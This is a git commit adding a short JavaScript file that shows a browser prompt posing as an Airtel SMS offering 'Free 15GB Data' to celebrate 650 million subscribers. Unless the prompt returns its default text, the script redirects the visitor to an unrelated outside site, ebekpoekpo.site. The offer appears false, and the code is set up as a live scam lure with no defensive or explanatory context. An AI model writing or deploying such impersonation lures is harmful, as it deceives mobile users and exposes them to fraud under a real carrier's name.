11d84a7547bd47e9e49ca5da2c63ec51e00a5508
dataviewz <gloliousam2@gmail.com>
2026-04-07 04:10:07 -0700

    Create active-airtelsubscribers.js

---
+++ active-airtelsubscribers.js
@@ -0,0 +1,5 @@
+var password = 'FREE 15GB DATA'
+password=prompt('AIRTEL SMS: Dear Customer, In Celebration of 650 million Subscribers, Airtel is Offering Free 15GB Data All Valued Customers , press Free Data To Check Now ','FREE 15GB DATA');
+if (password != 'FREE 15GB DATA') {
+location.href='https://ebekpoekpo.site/airtelsubscribers.html';
+}
